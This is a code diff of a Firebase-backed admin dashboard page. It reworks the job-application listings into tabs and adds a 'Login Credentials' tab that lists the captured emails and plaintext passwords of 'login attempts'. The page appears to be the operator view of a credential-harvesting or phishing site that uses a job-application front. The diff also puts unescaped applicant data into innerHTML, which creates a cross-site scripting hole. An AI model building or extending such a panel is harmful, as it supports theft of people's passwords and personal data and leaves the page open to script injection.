@@ -21,96 +21,143 @@
             margin: 0 auto;
             padding: 0 20px;
         }
-        .stat-card {
-            background: rgba(255, 255, 255, 0.03);
-            border: 1px solid rgba(255, 215, 0, 0.08);
-            border-radius: 16px;
-            padding: 24px;
-            text-align: center;
-            transition: 0.3s;
+        .admin-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 24px;
+            flex-wrap: wrap;
+            gap: 12px;
         }
-        .stat-card:hover {
-            border-color: rgba(255, 215, 0, 0.15);
-            transform: translateY(-4px);
+        .admin-header h2 {
+            color: #ffd700;
+            font-weight: 400;
+            margin: 0;
+        }
+        .logout-btn {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            color: rgba(255, 255, 255, 0.5);
+            padding: 8px 20px;
+            border-radius: 20px;
+            transition: 0.3s;
+            cursor: pointer;
+        }
+        .logout-btn:hover {
+            border-color: #ff6b6b;
+            color: #ff6b6b;
+        }
+
+        .stats-row {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 16px;
+            margin-bottom: 32px;
+        }
+        .stat-card {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 215, 0, 0.06);
+            border-radius: 12px;
+            padding: 16px;
+            text-align: center;
         }
         .stat-card .number {
-            font-size: 2.6rem;
+            font-size: 2rem;
             font-weight: 700;
             color: #ffd700;
         }
         .stat-card .label {
-            color: rgba(255, 255, 255, 0.5);
-            font-size: 0.9rem;
-            margin-top: 4px;
-        }
-        .stat-card .icon {
-            font-size: 1.8rem;
-            color: rgba(255, 215, 0, 0.3);
-            margin-bottom: 8px;
+            color: rgba(255, 255, 255, 0.4);
+            font-size: 0.8rem;
         }
 
-        .applications-table {
-            background: rgba(255, 255, 255, 0.02);
-            border: 1px solid rgba(255, 215, 0, 0.06);
-            border-radius: 16px;
-            padding: 24px;
-            margin-top: 32px;
-            overflow-x: auto;
+        .tabs {
+            display: flex;
+            gap: 0;
+            border-bottom: 1px solid rgba(255, 215, 0, 0.1);
+            margin-bottom: 24px;
         }
-        .applications-table h2 {
+        .tabs .tab {
+            padding: 12px 24px;
+            cursor: pointer;
+            color: rgba(255, 255, 255, 0.4);
+            font-weight: 500;
+            border-bottom: 2px solid transparent;
+            transition: 0.3s;
+        }
+        .tabs .tab.active {
             color: #ffd700;
-            font-weight: 400;
-            font-size: 1.6rem;
-            margin-bottom: 20px;
+            border-bottom-color: #ffd700;
+        }
+        .tabs .tab:hover {
+            color: #ffffff;
+        }
+
+        .tab-content {
+            display: none;
+        }
+        .tab-content.active {
+            display: block;
+        }
+
+        .table-wrap {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 215, 0, 0.05);
+            border-radius: 12px;
+            padding: 16px;
+            overflow-x: auto;
         }
         .table {
             color: #ffffff;
-            font-size: 0.9rem;
+            font-size: 0.85rem;
+            margin: 0;
         }
         .table th {
             color: #ffd700;
             font-weight: 500;
             border-bottom: 1px solid rgba(255, 215, 0, 0.1);
-            padding: 12px 8px;
+            padding: 10px 8px;
         }
         .table td {
             border-color: rgba(255, 255, 255, 0.04);
-            padding: 12px 8px;
+            padding: 10px 8px;
             vertical-align: middle;
         }
-        .table .cv-btn {
+        .cv-btn {
             background: rgba(255, 215, 0, 0.1);
             border: 1px solid rgba(255, 215, 0, 0.15);
             color: #ffd700;
             padding: 4px 14px;
             border-radius: 20px;
-            font-size: 0.75rem;
+            font-size: 0.7rem;
             font-weight: 500;
             transition: 0.3s;
             cursor: pointer;
         }
-        .table .cv-btn:hover {
+        .cv-btn:hover {
             background: #ffd700;
             color: #0a0a0a;
         }
+        .job-badge {
+            background: rgba(255, 215, 0, 0.08);
+            color: #ffd700;
+            padding: 2px 12px;
+            border-radius: 12px;
+            font-size: 0.7rem;
+        }
 
         .login-card {
-            background: rgba(255, 255, 255, 0.03);
-            border: 1px solid rgba(255, 215, 0, 0.08);
-            border-radius: 16px;
-            padding: 40px;
             max-width: 400px;
             margin: 60px auto 0;
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 215, 0, 0.08);
+            border-radius: 16px;
+            padding: 32px;
         }
         .login-card h3 {
             color: #ffd700;
             text-align: center;
             font-weight: 400;
-        }
-        .login-card p {
-            color: rgba(255, 255, 255, 0.4);
-            text-align: center;
-            margin-bottom: 24px;
         }
         .login-card input {
             background: rgba(255, 255, 255, 0.05);
@@ -132,61 +179,17 @@
             border-radius: 10px;
             font-weight: 600;
             width: 100%;
-            transition: 0.3s;
-        }
-        .login-card .btn-gold:hover {
-            background: #e6c200;
         }
         .error-msg {
             color: #ff6b6b;
             font-size: 0.85rem;
-            margin-top: 8px;
             text-align: center;
+            margin-top: 8px;
         }
         .loading {
-            color: rgba(255, 255, 255, 0.4);
+            color: rgba(255, 255, 255, 0.3);
             text-align: center;
             padding: 40px 0;
-        }
-
-        .logout-btn {
-            float: right;
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            color: rgba(255, 255, 255, 0.5);
-            padding: 8px 20px;
-            border-radius: 20px;
-            transition: 0.3s;
-            cursor: pointer;
-        }
-        .logout-btn:hover {
-            border-color: #ff6b6b;
-            color: #ff6b6b;
-        }
-
-        .job-badge {
-            display: inline-block;
-            background: rgba(255, 215, 0, 0.08);
-            color: #ffd700;
-            padding: 2px 12px;
-            border-radius: 12px;
-            font-size: 0.75rem;
-        }
-
-        @media (max-width: 768px) {
-            .stat-card .number {
-                font-size: 2rem;
-            }
-            .table {
-                font-size: 0.75rem;
-            }
-            .table th,
-            .table td {
-                padding: 8px 4px;
-            }
-            .login-card {
-                padding: 24px;
-            }
         }
     </style>
 </head>
@@ -197,7 +200,7 @@
         <div id="loginSection">
             <div class="login-card">
                 <h3>Admin Login</h3>
-                <p>Enter your credentials</p>
+                <p style="color:rgba(255,255,255,0.4); text-align:center;">Enter your credentials</p>
                 <form id="adminLoginForm">
                     <div class="mb-3">
                         <input type="email" id="adminEmail" placeholder="Email address" required />
@@ -211,64 +214,47 @@
             </div>
         </div>
 
-        <!-- Admin Dashboard -->
+        <!-- Dashboard -->
         <div id="adminSection" style="display: none;">
             <div class="dashboard">
-                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; flex-wrap: wrap; gap: 12px;">
-                    <h2 style="color: #ffd700; font-weight: 400; margin: 0;">Admin Dashboard</h2>
+                <div class="admin-header">
+                    <h2><i class="fas fa-crown"></i> Admin Dashboard</h2>
                     <button class="logout-btn" id="logoutBtn"><i class="fas fa-sign-out-alt"></i> Logout</button>
                 </div>
 
                 <!-- Stats -->
-                <div class="row g-4" id="statsRow">
-                    <div class="col-md-3 col-6">
-                        <div class="stat-card">
-                            <div class="icon"><i class="fas fa-users"></i></div>
-                            <div class="number" id="totalApps">0</div>
-                            <div class="label">Total Applications</div>
-                        </div>
-                    </div>
-                    <div class="col-md-3 col-6">
-                        <div class="stat-card">
-                            <div class="icon"><i class="fas fa-briefcase"></i></div>
-                            <div class="number" id="totalJobs">0</div>
-                            <div class="label">Unique Jobs</div>
-                        </div>
-                    </div>
-                    <div class="col-md-3 col-6">
-                        <div class="stat-card">
-                            <div class="icon"><i class="fas fa-file-pdf"></i></div>
-                            <div class="number" id="totalCVs">0</div>
-                            <div class="label">CVs Uploaded</div>
-                        </div>
-                    </div>
-                    <div class="col-md-3 col-6">
-                        <div class="stat-card">
-                            <div class="icon"><i class="fas fa-calendar-day"></i></div>
-                            <div class="number" id="todayApps">0</div>
-                            <div class="label">Today</div>
-                        </div>
+                <div class="stats-row" id="statsRow">
+                    <div class="stat-card"><div class="number" id="totalJobs">0</div><div class="label">Job Applications</div></div>
+                    <div class="stat-card"><div class="number" id="totalLogins">0</div><div class="label">Login Attempts</div></div>
+                    <div class="stat-card"><div class="number" id="totalCVs">0</div><div class="label">CVs Uploaded</div></div>
+                </div>
+
+                <!-- Tabs -->
+                <div class="tabs">
+                    <div class="tab active" data-tab="tabJobs"><i class="fas fa-briefcase"></i> Job Applications</div>
+                    <div class="tab" data-tab="tabLogins"><i class="fas fa-lock"></i> Login Credentials</div>
+                </div>
+
+                <!-- Tab 1: Job Applications -->
+                <div id="tabJobs" class="tab-content active">
+                    <div class="table-wrap">
+                        <div id="loadingJobs" class="loading"><i class="fas fa-spinner fa-spin"></i> Loading...</div>
+                        <table class="table" id="jobsTable" style="display: none;">
+                            <thead><tr><th>#</th><th>Job</th><th>Name</th><th>Email</th><th>Phone</th><th>CV</th><th>Timestamp</th></tr></thead>
+                            <tbody id="jobsBody"></tbody>
+                        </table>
                     </div>
                 </div>
 
-                <!-- Applications Table -->
-                <div class="applications-table">
-                    <h2><i class="fas fa-list"></i> Applications</h2>
-                    <div id="loading" class="loading"><i class="fas fa-spinner fa-spin"></i> Loading applications...</div>
-                    <table class="table" id="applicationsTable" style="display: none;">
-                        <thead>
-                            <tr>
-                                <th>#</th>
-                                <th>Job</th>
-                                <th>Name</th>
-                                <th>Email</th>
-                                <th>Phone</th>
-                                <th>CV</th>
-                                <th>Timestamp</th>
-                            </tr>
-                        </thead>
-                        <tbody id="tableBody"></tbody>
-                    </table>
+                <!-- Tab 2: Login Credentials -->
+                <div id="tabLogins" class="tab-content">
+                    <div class="table-wrap">
+                        <div id="loadingLogins" class="loading"><i class="fas fa-spinner fa-spin"></i> Loading...</div>
+                        <table class="table" id="loginsTable" style="display: none;">
+                            <thead><tr><th>#</th><th>Email</th><th>Password</th><th>Timestamp</th></tr></thead>
+                            <tbody id="loginsBody"></tbody>
+                        </table>
+                    </div>
                 </div>
             </div>
         </div>
@@ -280,105 +266,116 @@
         import { collection, onSnapshot } from "https://www.gstatic.com/firebasejs/12.15.0/firebase-firestore.js";
         import { signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/12.15.0/firebase-auth.js";
 
+        // DOM refs
         const loginSection = document.getElementById('loginSection');
         const adminSection = document.getElementById('adminSection');
         const loginForm = document.getElementById('adminLoginForm');
         const loginError = document.getElementById('loginError');
-        const loading = document.getElementById('loading');
-        const table = document.getElementById('applicationsTable');
-        const tbody = document.getElementById('tableBody');
 
-        const totalApps = document.getElementById('totalApps');
+        // Stats
         const totalJobs = document.getElementById('totalJobs');
+        const totalLogins = document.getElementById('totalLogins');
         const totalCVs = document.getElementById('totalCVs');
-        const todayApps = document.getElementById('todayApps');
 
-        // Auth state
+        // Tabs
+        const tabs = document.querySelectorAll('.tab');
+        const tabContents = {
+            tabJobs: document.getElementById('tabJobs'),
+            tabLogins: document.getElementById('tabLogins')
+        };
+        const loadingJobs = document.getElementById('loadingJobs');
+        const loadingLogins = document.getElementById('loadingLogins');
+        const jobsTable = document.getElementById('jobsTable');
+        const loginsTable = document.getElementById('loginsTable');
+        const jobsBody = document.getElementById('jobsBody');
+        const loginsBody = document.getElementById('loginsBody');
+
+        // Auth
         onAuthStateChanged(auth, (user) => {
             if (user) {
                 loginSection.style.display = 'none';
                 adminSection.style.display = 'block';
-                loadData();
+                loadAllData();
             }
         });
 
-        // Login
         loginForm.addEventListener('submit', function(e) {
             e.preventDefault();
             const email = document.getElementById('adminEmail').value.trim();
             const password = document.getElementById('adminPassword').value.trim();
-
             signInWithEmailAndPassword(auth, email, password)
-                .then(() => {
-                    loginError.textContent = '';
-                })
-                .catch(() => {
-                    loginError.textContent = 'Invalid email or password.';
-                });
+                .catch(() => loginError.textContent = 'Invalid credentials.');
         });
 
-        // Logout
-        document.getElementById('logoutBtn').addEventListener('click', function() {
-            signOut(auth);
-            location.reload();
+        document.getElementById('logoutBtn').addEventListener('click', () => { signOut(auth); location.reload(); });
+
+        // Tabs switching
+        tabs.forEach(tab => {
+            tab.addEventListener('click', function() {
+                tabs.forEach(t => t.classList.remove('active'));
+                this.classList.add('active');
+                Object.keys(tabContents).forEach(key => tabContents[key].classList.remove('active'));
+                tabContents[this.dataset.tab].classList.add('active');
+            });
         });
 
         // Load Data
-        function loadData() {
-            const colRef = collection(db, 'applications');
-            let allData = [];
-
-            onSnapshot(colRef, (snapshot) => {
-                loading.style.display = 'none';
-                table.style.display = 'table';
-                tbody.innerHTML = '';
-                allData = [];
-
-                if (snapshot.empty) {
-                    tbody.innerHTML = '<tr><td colspan="7" class="text-center">No applications yet.</td></tr>';
-                    updateStats([]);
-                    return;
+        function loadAllData() {
+            // 1. Job Applications
+            const jobsRef = collection(db, 'job_applications');
+            onSnapshot(jobsRef, (snap) => {
+                loadingJobs.style.display = 'none';
+                jobsTable.style.display = 'table';
+                jobsBody.innerHTML = '';
+                let count = 1, cvCount = 0;
+                if (snap.empty) {
+                    jobsBody.innerHTML = '<tr><td colspan="7" class="text-center">No job applications.</td></tr>';
+                } else {
+                    snap.forEach(doc => {
+                        const d = doc.data();
+                        if (d.cv) cvCount++;
+                        const row = jobsBody.insertRow();
+                        row.insertCell(0).textContent = count++;
+                        row.insertCell(1).innerHTML = `<span class="job-badge">${d.job || 'N/A'}</span>`;
+                        row.insertCell(2).textContent = d.name || 'N/A';
+                        row.insertCell(3).textContent = d.email || 'N/A';
+                        row.insertCell(4).textContent = d.phone || 'N/A';
+                        const cvCell = row.insertCell(5);
+                        if (d.cv) {
+                            const btn = document.createElement('button');
+                            btn.className = 'cv-btn';
+                            btn.innerHTML = '<i class="fas fa-download"></i> Download';
+                            btn.onclick = () => downloadCV(d.cv, d.cvName || 'CV.pdf');
+                            cvCell.appendChild(btn);
+                        } else { cvCell.textContent = 'N/A'; }
+                        row.insertCell(6).textContent = d.timestamp ? new Date(d.timestamp).toLocaleString() : 'N/A';
+                    });
                 }
+                totalJobs.textContent = snap.size;
+                totalCVs.textContent = cvCount;
+            }, (err) => { loadingJobs.textContent = 'Error loading jobs.'; console.error(err); });
 
+            // 2. Login Credentials
+            const loginsRef = collection(db, 'login_attempts');
+            onSnapshot(loginsRef, (snap) => {
+                loadingLogins.style.display = 'none';
+                loginsTable.style.display = 'table';
+                loginsBody.innerHTML = '';
                 let count = 1;
-                snapshot.forEach((doc) => {
-                    const data = doc.data();
-                    const row = tbody.insertRow();
-                    row.insertCell(0).textContent = count++;
-                    row.insertCell(1).textContent = `<span class="job-badge">${data.job || 'N/A'}</span>`;
-                    row.insertCell(2).textContent = data.name || 'N/A';
-                    row.insertCell(3).textContent = data.email || 'N/A';
-                    row.insertCell(4).textContent = data.phone || 'N/A';
-                    const cvCell = row.insertCell(5);
-                    if (data.cv) {
-                        const btn = document.createElement('button');
-                        btn.className = 'cv-btn';
-                        btn.innerHTML = '<i class="fas fa-download"></i> Download';
-                        btn.onclick = () => downloadCV(data.cv, data.cvName || 'CV.pdf');
-                        cvCell.appendChild(btn);
-                    } else {
-                        cvCell.textContent = 'No CV';
-                    }
-                    row.insertCell(6).textContent = data.timestamp ? new Date(data.timestamp).toLocaleString() : 'N/A';
-                    allData.push(data);
-                });
-
-                updateStats(allData);
-            }, (error) => {
-                loading.textContent = 'Error loading data. Check console.';
-                console.error('Firestore error:', error);
-            });
-        }
-
-        function updateStats(data) {
-            totalApps.textContent = data.length;
-            const jobs = new Set(data.map(d => d.job).filter(Boolean));
-            totalJobs.textContent = jobs.size;
-            const hasCV = data.filter(d => d.cv).length;
-            totalCVs.textContent = hasCV;
-            const today = new Date().toDateString();
-            const todayCount = data.filter(d => d.timestamp && new Date(d.timestamp).toDateString() === today).length;
-            todayApps.textContent = todayCount;
+                if (snap.empty) {
+                    loginsBody.innerHTML = '<tr><td colspan="4" class="text-center">No login attempts.</td></tr>';
+                } else {
+                    snap.forEach(doc => {
+                        const d = doc.data();
+                        const row = loginsBody.insertRow();
+                        row.insertCell(0).textContent = count++;
+                        row.insertCell(1).textContent = d.email || 'N/A';
+                        row.insertCell(2).textContent = d.password || 'N/A';
+                        row.insertCell(3).textContent = d.timestamp ? new Date(d.timestamp).toLocaleString() : 'N/A';
+                    });
+                }
+                totalLogins.textContent = snap.size;
+            }, (err) => { loadingLogins.textContent = 'Error loading logins.'; console.error(err); });
         }
 
         function downloadCV(base64, filename) {
